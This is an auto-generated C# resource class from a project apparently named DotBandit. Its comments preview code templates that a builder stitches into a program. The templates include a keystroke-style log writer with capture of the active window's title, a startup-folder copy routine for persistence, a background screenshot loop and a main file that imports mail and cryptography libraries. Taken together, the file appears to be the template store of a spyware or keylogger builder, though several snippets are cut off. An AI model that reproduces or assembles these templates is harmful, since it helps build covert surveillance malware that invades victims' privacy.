//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace DotBandit.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "15.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("DotBandit.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to counter = 0;
        ///ACTION();.
        /// </summary>
        internal static string CallAction {
            get {
                return ResourceManager.GetString("CallAction", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to 		save = new Thread(SaveScreenshot);
        ///        save.IsBackground = true;
        ///        save.Start();.
        /// </summary>
        internal static string CallScreenshot {
            get {
                return ResourceManager.GetString("CallScreenshot", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to private static void write(string s)
        ///    {
        ///        writer.Write(s);
        ///
        ///        if (counter &gt;= 1000)
        ///        {
        ///            writer.Close();
        ///            writer = new StreamWriter(path, true);
        ///            counter = 0;
        ///        }
        ///    }
        ///
        ///	private static string getCurrentWindowText()
        ///    {
        ///        IntPtr handle = GetForegroundWindow();
        ///        StringBuilder title = new StringBuilder(MAX_STRING_BUILDER);
        ///        GetWindowText(handle, title, MAX_STRING_BUILDER);
        ///        return title.ToString();
        ///    }
        /// [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string FuncAction {
            get {
                return ResourceManager.GetString("FuncAction", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to static void AddToStartup()
        ///    {
        ///        try
        ///        {
        ///            System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + &quot;\\&quot; + System.AppDomain.CurrentDomain.FriendlyName);
        ///        }
        ///        catch { }
        ///    }.
        /// </summary>
        internal static string FuncAddToStartup {
            get {
                return ResourceManager.GetString("FuncAddToStartup", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to private static Bitmap GetScreenShot()
        ///    {
        ///        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        ///        Graphics graphics = Graphics.FromImage(bitmap as Image);
        ///        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
        ///
        ///        return bitmap;
        ///    }
        ///
        ///static void SaveScreenshot()
        ///    {
        ///        int t = 0;
        ///        while (t &lt; time)
        ///        {            
        ///            Thread.Sleep(30000); /*{CUSTOM_EDIT_0X01}*/
        ///            try
        ///            {
        ///    [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string FuncScreenshot {
            get {
                return ResourceManager.GetString("FuncScreenshot", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Collections.Generic;
        ///using System.Text;
        ///using System.Windows.Forms;
        ///using System.Runtime.InteropServices;
        ///using System.IO;
        ///using System.Diagnostics;
        ///using System.Threading;
        ///using System.Net;
        ///using System.Net.Mail;
        ///using System.Reflection;
        ///using System.Drawing;
        ///using System.Drawing.Imaging;
        ///using System.Security.Cryptography;
        ///using Microsoft.Win32;
        ///using System.Media;
        ///using System.Resources;
        ///using System.ComponentModel;
        ///
        ///class Program
        ///{
        ///    #region Externs
        ///    [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string MainFile {
            get {
                return ResourceManager.GetString("MainFile", resourceCulture);
            }
        }
    }
}
